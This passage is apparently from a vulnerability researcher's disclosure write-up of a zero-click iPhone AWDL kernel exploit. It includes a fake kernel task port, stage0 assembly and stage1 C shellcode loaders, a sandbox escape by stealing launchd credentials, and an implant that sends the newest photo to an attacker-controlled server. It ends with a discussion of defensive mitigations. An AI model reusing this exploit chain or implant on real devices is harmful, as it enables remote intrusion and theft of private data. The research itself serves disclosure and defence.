We can see a reference to pmap\_cs\_enforced in the snippet above but the definition of this method is stripped from the released XNU source code. With IDA we can see it's checking the byte at offset +0x108 in the pmap structure. Nowhere in the XNU code seems to manipulate this field though.

Reversing the pmap\_cs PPL code we find that this field is referenced in pmap\_cs\_associate\_internal\_options, called by PPL routine 44.

This function has some helpful logging strings from which we can learn that it's being called to associate a code-signing structure with a virtual memory region. This code signing structure is a pmap\_cs\_code\_directory, and we can determine from this panic log message:

#### if (trust\_level != 3) {

#### panic("\\"trying to enter a binary in nested region with too low trust level %d\\"", cd\_entry->trust\_level);

#### }

that the field at +0x54 represents the "trust level" of the binary.

Further down the function we can see this:

#### if ( trust\_level != 1 )

#### goto LABEL\_38;

#### pmap->pmap\_cs\_enforced = 0;

#### ...

#### return KERN\_NOT\_SUPPORTED;

Probably my test apps signed by my developer certificate are getting this trust\_level of 1 and therefore falling back to the old code-signing enforcement code. I had a hunch that maybe this also applied to third-party applications from the App Store; rather than painstakingly continuing to reverse engineer pmap\_cs I just tried installing and running an App Store app (in this case, YouTube) on the phone then using oob\_timestamp to dump the pmap structures for each running process. Indeed, there were three pmaps with pmap\_cs\_enforced set to 0: kernel\_task (not so interesting because [KTRR](https://projectzero.google/2019/10/ktrw-journey-to-build-debuggable-iphone.html) protects the kernel TEXT segment), oob\_timestamp and YouTube!

This means that we can use the remote kernel read/write to inject shellcode into any third-party app running on the device. Of course, we don't want the prerequisite that the target needs to be running a third-party application, so we can use the technique developed earlier to open the calculator to instead spawn a third-party app. If the device doesn't have any third-party applications installed this technique wouldn't work, but we already have kernel memory read/write so there are many more avenues available for running code in some form on the device. But for now, we'll assume the target device has at least one App Store app installed.

# Uploading payloads

Our arbitrary write is reasonably fast but still too slow for us to use it to write an entire payload into the physmap that way. Instead, let's create a staged loader.

We will try to write a minimal piece of initial shellcode via the physmap which will be run as the fake signal handler. Its only purpose will be to bootstrap a larger payload and jump to it. The idea will be to place fragments of our final payload in kernel memory which the bootstrap code will find, copy into userspace, make executable and jump to.

# A useful memory leak

Earlier I discussed the service\_response technique for building a heap groom. I noted that this was an almost perfect heap grooming primitive: we control the size of the allocations and can place arbitrary bytes at arbitrary offsets within them. I also noted that it seemed to be a true memory leak as even when the AWDL interface is disabled, the memory never gets freed.

This also seems like a great primitive for staging our payload. All we need to do is figure out the address of the leaked memory.

The parser for the service response TLV (type 2) which causes the memory wraps the kalloc'ed buffer in an IO80211ServiceRequestDescriptor object. The pointer to the buffer is at offset +0x40 in there.

The IO80211ServiceRequestDescriptor is then enqueued into an IO80211CommandQueue in the IO80211AWDLPeerManager at +0x2968 which I've called response\_fragments:

#### peer\_manager->response\_fragments->lockEnqueue(response)

The lockEnqueue method calls ::enqueue which will add the new element at the head of the queue's linked list if either of the two following checks pass:

#### if ( this->max\_elems\_per\_bucket == 0x1000000 \|\|

#### this->max\_elems\_per\_bucket \* this->num\_buckets > this->count )

If these checks fail the enqueue method returns an error, but the processServiceResponseTLV method never checks this error. The reason we get a true memory leak here is because the peer\_manager's response\_fragments queue is created with max\_elems\_per\_bucket set to 8, meaning that after 8 incomplete fragments have arrived no more will be enqueued. The service response code doesn't handle this case and the return value of lockEnqueue isn't checked. The code no longer has a pointer to the RequestDescriptor and it cannot be freed. This is in some ways convenient for the heap groom, but not at all convenient when we want to know the address of the allocation!

# Fixing the memory leak, sort of...

Using the arbitrary write we can increase the queue limit to a much higher value, and now our code works and we can, with just a few frames, place controlled buffers of up to around 1000 bytes in kernel memory and find their addresses by parsing the queue structure . Here's the wrapper function for this functionality in the exploit:

#### uint16\_t kmem\_leak\_peer\_id = 0;

#### uint64\_t

#### copy\_buffer\_to\_kmem(void\* buf,

#### size\_t len,

#### uint16\_t kalloc\_size,

#### uint16\_t offset) {

#### struct ether\_addr kmem\_leak\_peer =

#### \*(ether\_aton("22:99:33:71:00:00"));

#### \*(((uint16\_t\*)&kmem\_leak\_peer)+2) = kmem\_leak\_peer\_id++;

#### inject(RT(),

#### WIFI(kl\_parm.dst, kmem\_leak\_peer),

#### AWDL(),

#### SYNC\_PARAMS(),

#### SERV\_PARAM(),

#### SERV\_RESP\_KALLOCER(buf, len, kalloc\_size, offset),

#### HT\_CAPS(),

#### DATAPATH(kmem\_leak\_peer),

#### PKT\_END());

#### uint64\_t serv\_resp\_q = rk64(kl\_parm.peer\_manager\_kaddr+0x2968);

#### uint64\_t buckets = rk64(serv\_resp\_q+0x48);

#### uint64\_t elem = rk64(buckets+0x8);

#### uint64\_t ptr = rk64(elem+0x40);

#### return ptr;

#### }

# Giving shellcode kernel memory read/write

We're going to want our payload to be able to read and write kernel memory just like we already can remotely. The canonical way to do this is to give the code a send right to a task port representing the kernel task. There are some new mitigations around this in iOS 13 (and more in iOS 14) but they're easily worked around because we already have kernel read/write using a different primitive.

We find the real kernel vm\_map, build a fake kernel task port object and task, ensuring the correct kalloc\_zone magic values are in the right place, then use the upload primitive to place them in kernel memory and find the addresses:

#### // build a fake kernel task:

#### uint64\_t kern\_proc = 0xFFFFFFF00941B818 + kaslr\_slide;

#### uint64\_t kern\_task = rk64(kern\_proc+0x10);

#### uint64\_t kern\_map  = rk64(kern\_task+0x28);

#### uint32\_t fake\_task\_buf\_size = 0x200;

#### uint8\_t\* fake\_task\_buf = malloc(fake\_task\_buf\_size);

#### memset(fake\_task\_buf, 0, fake\_task\_buf\_size);

#### \*(uint16\_t\*)(fake\_task\_buf+0x16) = 0x39;   // zone index for tasks

#### uint8\_t\* fake\_task = fake\_task\_buf + 0x100;

#### \*(uint64\_t\*)(fake\_task+0x000) = 0;        // lck\_mtx\_data

#### \*(uint8\_t\*) (fake\_task+0x00b) = 0x22;     // lck\_mtx\_type

#### \*(uint32\_t\*)(fake\_task+0x010) = 4;        // ref\_cnt

#### \*(uint32\_t\*)(fake\_task+0x014) = 1;        // active

#### \*(uint64\_t\*)(fake\_task+0x028) = kern\_map; // map

#### uint64\_t fake\_task\_buf\_kaddr = copy\_buffer\_to\_kmem(

#### fake\_task\_buf,

#### fake\_task\_buf\_size,

#### 0x8001,

#### 0);

#### uint64\_t fake\_task\_kaddr = fake\_task\_buf\_kaddr + 0x100;

#### // build a fake kernel task port:

#### uint64\_t target\_task\_port = rk64(target\_task + 0x108);

#### uint64\_t ipc\_space\_kernel = rk64(target\_task\_port + 0x60);

#### uint32\_t fake\_port\_buf\_size = 0x200;

#### uint8\_t\* fake\_port\_buf = malloc(fake\_task\_buf\_size);

#### memset(fake\_port\_buf, 0, fake\_port\_buf\_size);

#### \*(uint16\_t\*)(fake\_port\_buf+0x16) = 0x2a; // zone index for ipc ports

#### uint8\_t\* fake\_port = fake\_port\_buf + 0x100;

#### \*(uint32\_t\*)(fake\_port+0x000) = 0x80000000 \| 2;   // ip\_bits  \*(uint32\_t\*)(fake\_port+0x004) = 4;                // ip\_references

#### \*(uint64\_t\*)(fake\_port+0x060) = ipc\_space\_kernel; // ip\_receiver

#### \*(uint64\_t\*)(fake\_port+0x068) = fake\_task\_kaddr;  // ip\_kobject

#### \*(uint32\_t\*)(fake\_port+0x09c) = 1;                // ip\_mscount

#### \*(uint32\_t\*)(fake\_port+0x0a0) = 1;                // ip\_srights

#### uint64\_t fake\_port\_buf\_kaddr = copy\_buffer\_to\_kmem(

#### fake\_port\_buf,

#### fake\_port\_buf\_size,

#### 0x8001,

#### 0);

#### uint64\_t fake\_port\_kaddr = fake\_port\_buf\_kaddr + 0x100;

We then need the stage0 code to be able to use this fake port. [Canonically you would set this port as host special port 4](https://www.theiphonewiki.com/wiki/Hgsp4_patch), which the shellcode could then retrieve like this:

#### host\_get\_special\_port(host\_priv\_self(),

#### HOST\_LOCAL\_NODE,

#### 4,

#### &kernel\_task);

The issue is this requires a send right to the host\_priv port, which the app we're injecting the shellcode into won't have. Jailbreaks sometimes work around this by making the regular host port into the host\_priv port, but we don't want to do that as it also weakens some sandboxing primitives.

One option would be to add the port into the task's port namespace directly but this is a little fiddly. Instead, I chose to use a task special port. These are per-task ports, pointers to which are stored in the task struct:

#### struct task {

#### ...

#### struct ipc\_port \*itk\_host;      /\* a send right \*/

#### struct ipc\_port \*itk\_bootstrap; /\* a send right \*/

#### struct ipc\_port \*itk\_seatbelt;  /\* a send right \*/

#### struct ipc\_port \*itk\_gssd;      /\* yet another send right \*/

#### struct ipc\_port \*itk\_debug\_control; /\* send right for debugmode communications \*/

#### struct ipc\_port \*itk\_task\_access; /\* and another send right \*/

#### struct ipc\_port \*itk\_resume;    /\* a receive right to resume this task \*/

#### struct ipc\_port \*itk\_registered\[TASK\_PORT\_REGISTER\_MAX\];

#### ...

I chose to use task special port 7 which is the now unused TASK\_SEATBELT\_PORTitk\_seatbelt.

We use our remote kernel read/write to write the fake kernel task pointer there:

#### wk64(target\_task+0x2e0, fake\_port\_kaddr);

Then the stage0 shellcode just has to do:

#### mach\_port\_t kernel\_task = MACH\_PORT\_NULL;

#### task\_get\_special\_port(mach\_task\_self(), 7, &kernel\_task);

to get a send right to a functional kernel task port and gain local kernel memory read/write.

# A shellcode framework: stage0

We're going to use the remote kernel memory read to find a victim process, traverse that victim process's page tables to find the physical address of a TEXT page (we'll use the first page of the binary). We'll then find the address of the mapping of that physical page in the physmap and use the remote kernel memory write to write a shellcode stub in there. We'll use the same fake-signal injection technique to force the victim process to jump to the start of our shellcode.

Since our remote kernel memory write is relatively slow (dozens of bytes a second) we don't want to inject our entire payload this way, instead we'll split it into multiple stages with stage0 being the only stage injected in this way. stage0's only purpose is to bootstrap a second, larger stage1. Here's the assembly of stage0:

#### .section \_\_TEXT,\_\_text

#### ; save sigreturn context:

#### mov x20, x4

#### ; save sigreturn token:

#### mov x21, x5

#### ; retrieve tfp0

#### sub sp, sp, \#0x10

#### ldr w0, task\_self\_name

#### mov w1, \#7 ; TASK\_SEATBELT\_PORT

#### mov x2, sp

#### ldr x8, task\_get\_special\_port

#### blr x8

#### ldr w19, \[sp\] ; tfp0!

#### ; read stage1 into userspace

#### mov w0, w19

#### ldr x1, stage1\_kaddr

#### ldr w2, stage1\_size

#### mov x3, sp

#### add x4, sp, \#0x08

#### ldr x8, mach\_vm\_read

#### blr x8

#### ; write stage1 into physmap

#### mov w0, w19

#### ldr x1, stage1\_physmap\_kaddr

#### ldp x2, x3, \[sp\]

#### ldr x8, mach\_vm\_write

#### blr x8

#### ldr x0, stage1\_uaddr

#### mov w1, \#0x4000

#### ldr x8, sys\_icache\_invalidate

#### blr x8

#### ; jump to stage1

#### mov w0, w19 ; tfp0

#### mov x1, x20 ; sigreturn context

#### mov x2, x21 ; sigretun token

#### ldr x8, stage1\_uaddr

#### blr x8

#### task\_self\_name:

#### .word 0x49494949

#### stage1\_size:

#### .word 0x43434343

#### stage1\_kaddr:

#### .quad 0x4141414141414141

#### mach\_vm\_read:

#### .quad 0x4242424242424242

#### stage1\_physmap\_kaddr:

#### .quad 0x4646464646464646

#### mach\_vm\_write:

#### .quad 0x4747474747474747

#### task\_get\_special\_port:

#### .quad 0x4848484848484848

#### sys\_icache\_invalidate:

#### .quad 0x4b4b4b4b4b4b4b4b

#### stage1\_uaddr:

#### .quad 0x4a4a4a4a4a4a4a4a

This could probably be smaller but will do for a demo.

At the bottom are constants; they'll get replaced by the exploit code just before they get written into the physmap. The exploit knows the userspace ASLR shift so is able to replace them with the correct runtime symbol values.

The shellcode retrieves the send right to the fake kernel task port we placed as task special port 7, uses it to read stage1 and immediately write it to the physmap. The last thing it does is invalidate the instruction cache by calling sys\_icache\_invalidate then it jumps to stage1:

# Stage1

Writing assembly is fun, for a bit. We really want to run code written in C as soon as possible. With a bit of care it is possible to write shellcode in C. To make things as simple as possible for the loader we will have no external linkage (you can't directly call any library functions) and no global variables. We want a binary where we can extract the text and cstring sections, jump to the start of the text and it will run.

We do of course want to be able to call library functions which can be done with some macro hackery:

#### \#define F(name, ...) \

#### ((typeof(name)\*)(\_dlsym(RTLD\_DEFAULT, \#name)))(\_\_VA\_ARGS\_\_)

This allows us to call arbitrary functions using a cstring of their name via dlsym, with the correct prototype. For example, varargs function will still work:

#### F(printf, "%s %d hello\\n", foo, 123);

For this we will need one global variable; we don't want a data segment so we force it to be in \_\_TEXT,\_\_text:

#### \#define FSYM(name) \

#### typeof(name)\* \_\#\#name \_\_attribute\_\_ ((section("\_\_TEXT,\_\_text"))) = (void\*)(0x4141414141414141);

#### FSYM(dlsym);

This symbol will again be resolved by the exploit and replaced before stage1 is uploaded.

We define one more symbol, kdata, which we set to point to a configuration structure we also upload into the kernel heap somewhere. This configuration structure tells stage1 where to find the chunks which make up stage 2 so it can be rebuilt:

#### struct kconf {

#### uint64\_t kaslr\_slide;

#### uint32\_t kbuf\_size;

#### uint32\_t n\_text\_fragments;

#### uint64\_t text\_fragments\[100\];

#### };

Here's stage1:

#### void

#### start(mach\_port\_t tfp0,

#### void\* sigreturn\_context,

#### void\* sigreturn\_token) {

#### F(asl\_log, NULL, NULL, ASL\_LEVEL\_ERR, "hello from stage1!");

#### // read kconf from data:

#### struct kconf kc;

#### mach\_vm\_size\_t out\_size;

#### F(mach\_vm\_read\_overwrite,

#### tfp0,

#### kdata,

#### sizeof(struct kconf),

#### (mach\_vm\_address\_t)(&kc),

#### (mach\_vm\_size\_t\*)(&out\_size));

#### // compute the total size of stage2:

#### uint32\_t total\_size = kc.n\_text\_fragments\*1024;

#### // roundup:

#### total\_size += 0x3fff;

#### total\_size &= (~0x3fff);

#### // allocate a buffer for stage2:

#### mach\_vm\_address\_t base;

#### mach\_port\_t self = F(task\_self\_trap);

#### F(mach\_vm\_allocate,

#### self,

#### &base,

#### total\_size,

#### VM\_FLAGS\_ANYWHERE);

#### // read each fragment into the right place

#### for (uint32\_t i = 0; i < kc.n\_text\_fragments; i++) {

#### F(mach\_vm\_read\_overwrite,

#### tfp0,

#### kc.text\_fragments\[i\],

#### 1024,

#### base+(i\*1024),

#### &out\_size);

#### }

#### // link \_dlsym:

#### uint64\_t needle = 0x4141414141414141;

#### volatile uint64\_t\* stage2\_dlsym\_addr = F(memmem,

#### base,

#### total\_size,

#### &needle,

#### 8);

#### \*stage2\_dlsym\_addr = \_dlsym;

#### // set the protection:

#### F(mach\_vm\_protect,

#### self,

#### base,

#### total\_size,

#### 0,

#### VM\_PROT\_READ \| VM\_PROT\_EXECUTE);

#### // jump to stage2:

#### void (\*stage2)(mach\_port\_t, void\*) = base;

#### stage2(tfp0, kdata);

#### }

We have a bit more leeway with the size of stage1; it can be up to around 1000 bytes.

It reads the configuration structure from the kernel, allocates memory for the final payload then reads in each chunk to the right place, sets the page protection accordingly and jumps to the final payload.

# Escaping the sandbox from the outside

We've now removed any size restrictions on our payload so are free to write more complex code. The first step is to unsandbox the process we've ended up in. We can do this by replacing our credential structure with that of a more privileged process:

#### uint64\_t kaslr\_slide = r64(tfp0, kc+offsetof(struct kconf, kaslr\_slide));

#### pid\_t our\_pid = F(getpid);

#### pid\_t launchd\_pid = 1;

#### uint64\_t our\_proc = 0;

#### uint64\_t launchd\_proc = 0;

#### // allproc

#### uint64\_t proc = r64(tfp0, 0xFFFFFFF00941C940+kaslr\_slide);

#### for (int i = 0; i < 1024; i++) {

#### pid\_t pid = r32(tfp0, proc+0x68);

#### if (pid == our\_pid) {

#### our\_proc = proc;

#### }

#### if (pid == launchd\_pid) {

#### launchd\_proc = proc;

#### }

#### if (launchd\_proc && our\_proc) {

#### break;

#### }

#### proc = r64(tfp0, proc+0);

#### }

#### // get launchd's ucreds:

#### uint64\_t launchd\_ucred = r64(tfp0, launchd\_proc+0x100); // p\_ucred

#### // use them to unsandbox ourselves:

#### w64(tfp0, our\_proc+0x100, launchd\_ucred);

We're still bound by the global [platform\_profile sandbox](http://newosxbook.com/files/HITSB.pdf) but this is enough to grant access to almost all user data.

# A minimal implant

At this point we basically have unfettered access to user data; we can read emails, private messages, photos, contacts, stream the camera and audio live and so on. I don't want to spend another month writing a fully-featured implant though so I decided to just steal the most recently taken photo:

Reading some mobile forensics websites we can see that iOS stores photos taken by the camera in /private/var/mobile/Media/DCIM/100APPLE.

We can use the unix readdir API to enumerate that directory and find the most recently created file with the extension .HEIC:

#### \#define timespec\_cmp(a, b, CMP)     \

#### ( ((a)->tv\_sec == (b)->tv\_sec) ?    \

#### ((a)->tv\_nsec CMP (b)->tv\_nsec) : \

#### ((a)->tv\_sec CMP (b)->tv\_sec))

#### struct dirent\* ep;

#### while (ep = F(readdir, dp)) {

#### F(asl\_log, NULL, NULL, ASL\_LEVEL\_ERR, ep->d\_name);

#### if (!F(strstr, ep->d\_name, ".HEIC")) {

#### // only interested in photos taken by the camera

#### continue;

#### }

#### char\* fullpath;

#### F(asprintf, &fullpath, "%s/%s", dirpath, ep->d\_name);

#### struct stat st;

#### F(stat, fullpath, &st);

#### if (timespec\_cmp(&st.st\_birthtimespec, &newest\_timespec, >)) {

#### newest\_photo\_path = fullpath;

#### newest\_timespec = st.st\_birthtimespec;

#### } else {

#### F(free, fullpath);

#### }

#### }

Then we just create a TCP socket, connect to a server we control and write the contents of that file to the socket:

#### int sock = F(socket, PF\_INET, SOCK\_STREAM, 0);

#### struct sockaddr\_in addr = {0};

#### addr.sin\_family = PF\_INET;

#### addr.sin\_port = htons(1234);

#### addr.sin\_addr.s\_addr = F(inet\_addr, "10.0.1.2");

#### int conn\_err = F(connect,sock, &addr, sizeof(addr));

#### if (conn\_err) {

#### F(asl\_log, NULL, NULL, ASL\_LEVEL\_ERR, "connect failed");

#### F(sleep, 1000);

#### }

#### size\_t photo\_size = 0;

#### char\* photo\_buf = load\_file(newest\_photo\_path, &photo\_size);

#### F(write,sock, photo\_buf, photo\_size);

#### F(close, sock);

# Process continuation

stage0 saved the sigreturn context and token which can now be used to let this thread continue safely. A real implant could now continue running in a separate thread and perform the necessary cleanup in the kernel to ensure AWDL can be safely disabled and the implant can continue to run in the background. For us this is where the journey ends.

# End-to-end demo

AWDL Implant Demo - YouTube

Tap to unmute

[AWDL Implant Demo](https://www.youtube.com/watch?v=_sTw7GGoJ6g) [Ian Beer](https://www.youtube.com/channel/UC-NT5AokdA2-XbI_XHvMwPA)

![thumbnail-image](https://yt3.ggpht.com/ytc/AIdro_ly2S6SGXiVzX-0Xd2O3DtbdHQhH92vlcYxC4mmPK52FsY=s68-c-k-c0x00ffffff-no-rj)

Ian Beer1.62K subscribers

[Watch on](https://www.youtube.com/watch?v=_sTw7GGoJ6g)

### This demo shows the attacker successfully exploiting a victim iPhone 11 Pro device located in a different room through a closed door. The victim is using the Youtube app. The attacker forces the AWDL interface to activate then successfully exploits the AWDL buffer overflow to gain access to the device and run an implant as root. The implant has full access to the user's personal data, including emails, photos, messages, keychain and so on. The attacker demonstrates this by stealing the most recently taken photo. Delivery of the implant takes around two minutes, but with more engineering investment there's no reason this prototype couldn't be optimized to deliver the implant in a handful of seconds.

# Conclusion

My exploit is pretty rough around the edges. With some proper engineering and better hardware, once AWDL is enabled the entire exploit could run in a handful of seconds. There are likely also better techniques for getting AWDL enabled in the first place rather than the hash bruteforce. My goal was to build a compelling demo of what can be achieved by one person, with no special resources, and I hope I've achieved that.

There are further aspects I didn't cover in this post: AWDL can be remotely enabled on a locked device using the same attack, as long as it's been unlocked at least once after the phone is powered on. The vulnerability is also wormable; a device which has been successfully exploited could then itself be used to exploit further devices it comes into contact with.

The inevitable question is: But what about the next silver bullet: memory tagging (MTE)? Won't it stop this from happening?

My answer would be that Pointer Authentication was also pitched as ending memory corruption exploitation. When push came to shove, to actually ship a legacy codebase like the iOS kernel with Pointer Authentication, the primitives built using it and inserted by the compiler had to be watered down to such an extent that any competent attacker should have been able to modify their exploits to work around them. Undoubtedly this would have forced some extra work and probably some vulnerabilities were no longer as useful, but it's hard to quantify the true impact without knowing what vulnerabilities these attackers were also sitting on in preparation for exactly this eventuality. Pointer authentication shouldn't have come as a shock to any exploit developer, it had been expected for years.

Similarly, the ARM 8.5 specification containing the definitions of the Memory Tagging instructions has been [publicly available for the last two years](https://community.arm.com/developer/ip-products/processors/b/processors-ip-blog/posts/arm-a-profile-architecture-2018-developments-armv85a), that's plenty of time for attackers to prepare with publicly available information. It's reasonable to expect that top tier attacker groups also have insider/private information as well.

The implementation compromises on the software side which will be required to ship memory tagging will be different to those required for Pointer Authentication, but they will be there. Many mitigations built with MTE will be probabilistic in nature; will that be enough? And what about all the code constructs which might lead to bypasses? Nobody is going to check and rewrite every raw pointer cast in their codebase. Will the team responsible for performance accept the overhead of requiring every freed allocation to be zeroed? What about all the custom allocators? What about shared memory? What about intra-struct buffer overflows (like this AWDL vulnerability)? What about javascript? What about logic bugs and speculative side channels?

We know nothing about what primitives Apple might build with memory tagging, but we do have some insight from [Microsoft, who published a detailed analysis of the tradeoffs](https://github.com/microsoft/MSRC-Security-Research/blob/master/papers/2020/Security%20analysis%20of%20memory%20tagging.pdf) they are facing with their implementation. Sharing such information with the security community helps enormously in understanding those tradeoffs. Memory tagging will probably make some vulnerabilities unexploitable, just like Pointer Authentication probably did. But to quantify the true impact requires an estimate of the impact it has on the entire space of vulnerabilities, and it's in this estimate where the defensive and offensive communities differ. As things currently stand, there are probably just too many good vulnerabilities for any of these mitigations to pose much of a challenge to a motivated attacker. And, of course, mitigations only present in future hardware don't benefit the billions of devices already shipped and currently in use.

These mitigations do move the bar, but what do I think it would take to truly raise it?

Firstly, a long-term strategy and plan for how to modernize the enormous amount of critical legacy code that forms the core of iOS. Yes, I'm looking at you [vm\_map.c](https://github.com/apple/darwin-xnu/blob/master/osfmk/vm/vm_map.c), originally written in 1985 and still in use today! Let's not forget that PAC is still not available to third-party apps so memory corruption in a third party messaging app followed by a vm\_map logic bug is still going to get an attacker everything they want for probably years after MTE first ships.

Secondly, a short-term strategy for how to improve the quality of new code being added at an ever-increasing rate. This comes down to more investment in modern best practices like broad, automated testing, code review for critical, security sensitive code and high-quality internal documentation so developers can understand where their code fits in the overall security model.

Thirdly, a renewed focus on vulnerability discovery using more than just fuzzing. This means not just more variant analysis, but a large, dedicated effort to understand how attackers really work and beat them at their own game by doing what they do better.